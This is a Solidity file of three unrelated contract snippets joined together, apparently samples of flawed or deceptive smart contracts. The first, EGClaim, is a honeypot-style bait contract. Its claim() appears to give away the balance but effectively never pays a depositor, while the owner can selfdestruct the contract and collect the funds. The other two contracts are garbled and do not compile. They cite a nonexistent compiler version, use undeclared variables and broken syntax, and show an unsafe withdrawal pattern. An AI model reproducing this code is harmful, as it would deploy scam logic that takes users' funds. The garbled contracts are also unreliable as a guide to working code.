pragma solidity ^0.4.25;

contract EGClaim
{
    constructor() public payable {
        org = msg.sender;
    }
    function() external payable {}
    address org;
    function end() public {
        if (msg.sender==org)
            selfdestruct(msg.sender);
    }
    function claim() public payable {
        if (msg.value >= address(this).balance)
            msg.sender.transfer(address(this).balance);
    }
}
pragma solidity ^0.5.24;
contract check {
	uint validSender;
	constructor() public {owner = msg.sender;}
	function checkAccount(address account,uint key) {
		if (msg.sender != owner)
			throw;
			checkAccount[account] = key;
		}
	}
}
pragma solidity ^0.4.24;
contract CallTXNContract {
	uint depositAmount;
	constructor() public {owner = msg.sender;}
	function externalSignal() public {
  	if ((amountToWithdraw > 0) && (amountToWithdraw <= address(this).balance)) {
   		msg.sender.call{value: msg.value, gas: 5000}
   		depositAmount[msg.sender] = 0;
		}
	}
}
